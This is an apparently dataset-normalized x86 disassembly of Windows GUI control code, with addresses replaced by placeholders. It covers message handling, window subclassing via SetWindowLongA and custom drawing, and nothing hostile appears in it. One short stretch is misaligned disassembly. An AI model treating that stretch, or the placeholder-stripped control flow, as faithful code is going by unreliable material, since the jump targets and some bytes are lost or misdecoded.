mov ebx eax
mov eax [ ebx + 0x24c ]
test eax eax
jne r-xdata
push 0x0
push 0x0
call sub_418964
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebx + 0x24c ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x24c ]
call sub_418900
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax [ ebx + 0x22c ]
call sub_47dbd4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov edx edi
mov eax [ ebx + 0x22c ]
call sub_47dc04
call sub_47d56c
mov [ esp ] al
mov edx esp
mov ecx 0x1
mov eax [ ebx + 0x24c ]
mov ebp [ eax ]
call [ ebp + 0xc ]
inc edi
dec esi
jne r-xdata
sub_47f3c4
push ebx
push esi
push edi
mov ebx eax
cmp dl [ ebx + 0x274 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x274 ] dl
mov eax ebx
call sub_47f1b8
cmp [ ebx + 0x274 ] 0x0
je r-xdata
mov eax [ ebx + 0x22c ]
call sub_47dbd4
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_47f2b4
jmp r-xdata
inc edi
xor esi esi
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_47dc04
call sub_47da4c
push eax
mov eax ebx
call sub_448484
pop edx
call sub_4292ec
test eax eax
setne al
push eax
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_47dc04
pop edx
mov [ eax + 0x2a ] dl
inc esi
dec edi
jne r-xdata
sub_47f46c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jge r-xdata
mov edx esi
mov eax [ ebx + 0x22c ]
call sub_47dc04
mov cl 0x1
mov edx 0x3
call sub_47d760
mov eax ebx
call sub_48118c
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_48118c
xor ecx ecx
mov edx 0x3
call sub_47d760
pop esi
pop ebx
retn
sub_47f4fc
push ebx
mov ebx eax
mov eax [ ebx + 0x70 ]
call sub_421054
push eax
mov eax ebx
call sub_448484
pop edx
call sub_42924c
mov eax [ ebx + 0x70 ]
call sub_421054
push eax
mov eax ebx
call sub_448484
pop edx
call sub_429014
pop ebx
retn
sub_47f530
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x268 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x268 ] esi
mov eax ebx
call sub_448788
test al al
je r-xdata
mov eax ebx
call sub_448484
mov edx esi
call sub_429368
sub_47f560
push ebx
mov ebx eax
mov eax ebx
call sub_447a04
mov eax ebx
call sub_448788
test al al
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x70 ]
mov eax ebx
call sub_47f4fc
sub_47f584
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x214 ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_447ae8
pop esi
pop ebx
retn
mov eax ebx
call sub_445ac0
sub_47f5a8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403e54#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax ebx
call sub_446834
mov eax ebx
call sub_47f7d8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47f7ae
lea eax [ ebp - 0xc ]
call sub_40442c
retn
mov eax [ esi + 0x8 ]
mov eax [ eax ]
cmp eax [ ebx + 0x264 ]
jne r-xdata
mov edx [ esi + 0x8 ]
mov eax edx
mov eax [ eax + 0x8 ]
sub eax 0xfffffec9
je r-xdata
mov [ ebx + 0x295 ] 0x1
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax edx
mov edi [ eax + 0x14 ]
test [ edi ] 0x1
je r-xdata
sub eax 0x2
je r-xdata
mov edx [ eax + 0xc ]
mov eax ebx
call sub_481ff8
mov esi eax
mov eax [ esi + 0x18 ]
cmp eax [ edi + 0x4 ]
jl r-xdata
mov edi edx
mov edx [ edi + 0xc ]
mov eax ebx
call sub_481ff8
mov esi eax
mov eax ebx
call sub_448484
mov edx [ edi + 0xc ]
call sub_4291dc
mov edx eax
mov eax esi
call sub_47cd14
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x120 ]
test al al
je r-xdata
sub eax 0x12c
je r-xdata
mov eax [ esi + 0x14 ]
test eax eax
jle r-xdata
mov [ edi + 0x4 ] eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
call GetMessagePos
call sub_407438
movzx eax ax
push eax
call GetMessagePos
movzx eax ax
lea ecx [ ebp - 0x8 ]
pop edx
call sub_4068dc
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4418a8
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
mov eax ebx
call sub_448484
push eax
call ChildWindowFromPoint
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov edx [ edi + 0x4 ]
mov eax esi
call sub_47cd14
jmp r-xdata
cmp eax [ edi + 0x4 ]
jg r-xdata
mov eax ebx
call sub_448484
cmp esi eax
je r-xdata
mov [ edi + 0x4 ] eax
lea eax [ ebp - 0xc ]
mov edx 0x50
call sub_404a68
mov eax [ ebp - 0xc ]
call sub_4046e4
push eax
mov eax [ ebp - 0xc ]
call sub_4048dc
push eax
push esi
call GetClassNameA
mov edx eax
lea eax [ ebp - 0xc ]
call sub_404a68
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404828
jne r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4418a8
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x1c ]
push eax
push 0x1
push 0x1206
push esi
call SendMessageA
test eax eax
jl r-xdata
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_481ff8
mov edx eax
lea ecx [ ebp - 0x1c ]
mov eax ebx
mov si 0xffaf
call sub_4038bc
sub_47f7e4
push ebx
mov ebx eax
mov eax ebx
call sub_447a2c
mov eax ebx
call sub_448788
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x68 ]
mov edx [ eax + 0x18 ]
mov eax ebx
call sub_47f4dc
mov eax ebx
call sub_47f7d8
test al al
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x264 ]
push eax
call InvalidateRect
sub_47f838
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x215 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x215 ] dl
mov eax ebx
call sub_448788
test al al
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_448484
push eax
call GetWindowLongA
mov esi eax
and esi 0xfffffffc
xor eax eax
mov al [ ebx + 0x215 ]
or esi [ eax * 4 + rw-data ]
push esi
push 0xfffffff0
mov eax ebx
call sub_448484
push eax
call SetWindowLongA
mov eax ebx
call sub_4813ec
mov al [ ebx + 0x215 ]
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x234 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax ebx
call sub_4813cc
mov dl 0x3
mov eax ebx
call sub_4813cc
jmp r-xdata
sub_47f8bc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_4476d0
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x264 ] 0x0
jne r-xdata
mov edi [ esi + 0x8 ]
mov [ ebx + 0x264 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x260 ] eax
mov eax [ ebx + 0x25c ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x264 ]
push eax
call SetWindowLongA
sub_47f90c
push ebx
push esi
mov ebx eax
or esi 0xffffffff
mov eax ebx
call sub_48118c
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_48118c
call sub_47da4c
mov esi eax
sub_47f934
push ebx
cmp [ eax + 0x30a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x30c ]
call [ ebx + 0x308 ]
mov al 0x1
pop ebx
retn
sub_47f95c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] 0xffffffff
cmp [ eax + 0x312 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn 0x14
push ecx
mov ecx [ ebp + 0x18 ]
push ecx
mov ecx [ ebp + 0x14 ]
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov cl [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x314 ]
call [ ebx + 0x310 ]
sub_47f9a8
push ebx
cmp [ eax + 0x31a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x31c ]
call [ ebx + 0x318 ]
mov al 0x1
pop ebx
retn
sub_47f9d0
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x322 ] 0x0
je r-xdata
xor eax eax
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov cl [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x324 ]
call [ ebx + 0x320 ]
mov al 0x1
jmp r-xdata
pop ebx
pop ebp
retn 0x8
sub_47fa04
push ebx
push ecx
mov ebx eax
mov eax [ r-xdata ]
mov [ esp ] eax
cmp [ ebx + 0x372 ] 0x0
je r-xdata
mov ecx [ ebx + 0x22c ]
mov dl 0x1
mov eax [ esp ]
call sub_47d470
pop edx
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x374 ]
call [ ebx + 0x370 ]
sub_47fa50
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test esi 0x1
je r-xdata
test esi 0x2
je r-xdata
or bl 0x1
test esi 0x4
je r-xdata
or bl 0x2
test esi 0x8
je r-xdata
or bl 0x4
test esi 0x10
je r-xdata
or bl 0x8
mov eax ebx
pop esi
pop ebx
retn
or bl 0x10
sub_47fa9c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
lea edi [ ebp - 0x2c ]
mov ecx 0xa
[ edi ] [ esi ]
mov esi eax
xor eax eax
push ebp
push sub_47fbbb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x2c ]
test edi 0x4
je r-xdata
cmp [ esi + 0x244 ] 0x0
je r-xdata
mov ebx [ ebp - 0xc ]
jmp r-xdata
mov edx [ ebp - 0x28 ]
mov eax [ esi + 0x22c ]
call sub_47dc04
mov ebx eax
cmp [ ebp - 0x28 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47fbc2
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
xor ebx ebx
jmp r-xdata
mov ebx [ esi + 0x28c ]
jmp r-xdata
mov eax edi
call sub_47fa50
mov ebx eax
mov edi [ esi + 0x28c ]
mov eax [ ebp - 0x28 ]
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ edi + 0xc ] eax
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test bl 0x1
je r-xdata
lea eax [ ebp - 0x4 ]
call sub_40442c
cmp [ ebp - 0x18 ] 0x0
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esi + 0x28c ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
lea edx [ ebp - 0x4 ]
mov eax [ ebp - 0x18 ]
call sub_4091b4
jmp r-xdata
mov ecx ebx
mov edx [ esi + 0x28c ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x110 ]
mov ebx [ esi + 0x28c ]
jmp r-xdata
mov eax [ esi + 0x28c ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x28c ]
add eax 0x24
mov edx [ ebp - 0x4 ]
call sub_404480
test bl 0x2
je r-xdata
sub_47fbe0
test al 0x1
je r-xdata
test al 0x8
je r-xdata
xor eax eax
retn
test al 0x2
je r-xdata
mov al 0x1
jmp r-xdata
test al 0x40
je r-xdata
mov al 0x2
jmp r-xdata
retn
xor eax eax
mov al 0x3
jmp r-xdata
sub_47fc04
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test esi 0x20
je r-xdata
test esi 0x4
je r-xdata
or bl 0x20
test esi 0x8
je r-xdata
or bl 0x2
test esi 0x1
je r-xdata
or bl 0x4
test esi 0x2
je r-xdata
or bl 0x8
mov eax ebx
pop esi
pop ebx
retn
or bl 0x10
sub_47fc4d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff5c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x9c ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_48090d
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
mov eax [ esi + 0x8 ]
cmp eax 0xffffff97
jg r-xdata
cmp eax 0xffffff9c
jg r-xdata
je r-xdata
sub eax 0xfffffff4
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_47fa9c
mov edi eax
mov edx edi
mov eax [ ebp - 0x4 ]
mov si 0xffb2
call sub_4038bc
test al al
jne r-xdata
cmp eax 0xffffff8d
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
test eax eax
je r-xdata
sub eax 0x7
je r-xdata
mov eax [ ebp - 0x8 ]
mov ebx esi
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_47dc04
mov edx eax
mov ecx [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_4038bc
test al al
jne r-xdata
sub eax 0xffffff98
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
sub eax 0xffffff8f
je r-xdata
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480914
lea eax [ ebp - 0x9c ]
call sub_40442c
lea eax [ ebp - 0x10 ]
call sub_40442c
retn
mov edx [ ebp - 0x8 ]
mov ebx esi
xor edx edx
push ebp
push j_sub_403e54#5
push [ fs : edx ]
mov [ fs : edx ] esp
call sub_422134
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebx + 0xc ]
test eax 0x10000
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x231 ] 0x1
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_47dbd4
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_448484
call sub_429184
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x258 ] ebx
push 0xfffffffc
push ebx
call GetWindowLongA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x254 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax + 0x10 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x118 ]
jmp r-xdata
sub eax 0x4
je r-xdata
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x8 ]
mov eax [ ebx + 0x14 ]
call sub_47fc04
push eax
mov eax [ ebx + 0x18 ]
call sub_47fc04
push eax
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x11c ]
jmp r-xdata
sub eax 0xfffffecc
je r-xdata
test eax 0x20000
setne [ ebp - 0x1a ]
cmp [ ebp - 0x1a ] 0x0
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0xc ]
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x1
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
mov edx ebx
call sub_47dc04
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_4038bc
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_4038bc
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov ebx esi
mov esi [ ebx + 0x14 ]
test [ esi ] 0x1
je r-xdata
sub eax 0x97
je r-xdata
lea eax [ ebp - 0x5c ]
xor ecx ecx
mov edx 0x28
call sub_402fc4
mov eax [ ebx + 0x24 ]
mov [ ebp - 0x58 ] eax
test [ ebx + 0xc ] 0x10002
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x120 ]
test al al
je r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_47dc04
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_4038bc
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_481180
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_4038bc
jmp r-xdata
sub eax 0x2
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_481180
mov eax [ eax + 0x18 ]
cmp eax [ esi + 0x4 ]
jl r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x35a ] 0x0
je r-xdata
sub eax 0x5
je r-xdata
mov eax [ ebx + 0xc ]
test eax 0x10001
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x298 ]
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x29c ]
test eax eax
je r-xdata
call sub_403f38
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x120 ]
test al al
jne r-xdata
xor eax eax
push ebp
push j_sub_403e54#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_422568
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_422408
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x170 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_422424
lea edx [ ebp - 0x34 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xfc ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
xor edx edx
call sub_422568
retn
mov cl 0x1
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x120 ]
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov ebx esi
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_47dc04
mov edi eax
mov ecx [ ebx + 0x1c ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_4038bc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x36a ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax esi
cmp [ eax + 0x20 ] 0x0
je r-xdata
jmp r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_481180
mov eax [ eax + 0x14 ]
cmp eax [ esi + 0x4 ]
jg r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_481180
mov eax [ eax + 0x18 ]
push eax
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_481180
pop edx
call sub_47cd14
jmp r-xdata
lea edx [ ebp - 0xa4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_44cc24
lea edx [ ebp - 0xa4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_462c90
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ebx esi
mov eax [ ebx + 0x10 ]
call sub_47fbe0
mov [ ebp - 0xa ] al
xor esi esi
lea eax [ ebp - 0x10 ]
call sub_40442c
lea ecx [ ebp - 0x18 ]
xor edx edx
xor eax eax
call sub_4068dc
mov [ ebp - 0x19 ] 0x4
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
sub eax 0x2
je r-xdata
test eax 0x10002
je r-xdata
xor edx edx
push ebp
push j_sub_403e54#6
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebx + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_422568
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_422408
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x170 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_422424
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov edx [ eax + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edx + 0xc ] ecx
mov [ edx + 0x8 ] sub_4819d0
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov [ eax + 0x8 ] sub_4819d0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28a ] 0x0
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x29c ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x298 ]
push eax
call DeleteObject
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x298 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x29c ] edx
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x20
mov cl 0x2
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x120 ]
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_4223e0
retn
lea edx [ ebp - 0x34 ]
mov cl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xfc ]
jmp r-xdata
mov cl 0x2
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x120 ]
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x1c ] 0x8
jne r-xdata
cmp [ eax + 0x10 ] 0xffffffff
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_481180
mov eax [ eax + 0x14 ]
push eax
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_481180
pop edx
call sub_47cd14
jmp r-xdata
mov esi [ ebx + 0x18 ]
jmp r-xdata
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_47fa9c
mov edi eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0xc ]
test [ ebx ] 0x1
je r-xdata
jmp r-xdata
test eax 0x10003
je r-xdata
cmp [ ebp - 0x1a ] 0x0
je r-xdata
push 0x0
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_47fa9c
mov edx eax
mov cx [ ebx + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x100 ]
mov [ ebp - 0x9 ] al
mov ax [ ebx + 0x28 ]
push eax
push 0x0
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_47fa9c
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x104 ]
mov [ ebp - 0x9 ] al
jmp r-xdata
mov cl 0x3
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x120 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x10
mov cl 0x1
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x120 ]
test al al
je r-xdata
lea edx [ ebp - 0x34 ]
mov cl 0x2
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xfc ]
jmp r-xdata
mov cl 0x3
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x120 ]
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
test [ ebx + 0x18 ] 0x2
je r-xdata
lea edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_4038bc
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push esi
mov eax [ ebx + 0xc ]
push eax
mov al [ ebp - 0x19 ]
push eax
test [ ebx + 0x10 ] 0x20
setne al
push eax
mov eax [ ebx + 0x10 ]
call sub_47fbe0
mov edx eax
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x114 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov edi [ ebx + 0x14 ]
test edi edi
je r-xdata
je r-xdata
test [ ebx ] 0x2
je r-xdata
mov esi [ ebx + 0x8 ]
test esi esi
jne r-xdata
test eax 0x10004
je r-xdata
cmp [ ebp - 0x1a ] 0x0
je r-xdata
push 0x1
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_47fa9c
mov edx eax
mov cx [ ebx + 0x28 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x100 ]
jmp r-xdata
mov ax [ ebx + 0x28 ]
push eax
push 0x1
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_47fa9c
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x104 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28a ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x4
call sub_403f38
call sub_403f38
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
xor ecx ecx
mov dl 0x2
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x120 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x40
lea edx [ ebp - 0x34 ]
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xfc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
je r-xdata
test [ ebx + 0x18 ] 0x2
jne r-xdata
test [ ebx + 0x14 ] 0x2
jne r-xdata
lea eax [ ebp - 0x10 ]
call sub_40442c
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_4091b4
jmp r-xdata
mov eax [ ebx + 0x1c ]
mov [ ebp - 0x18 ] eax
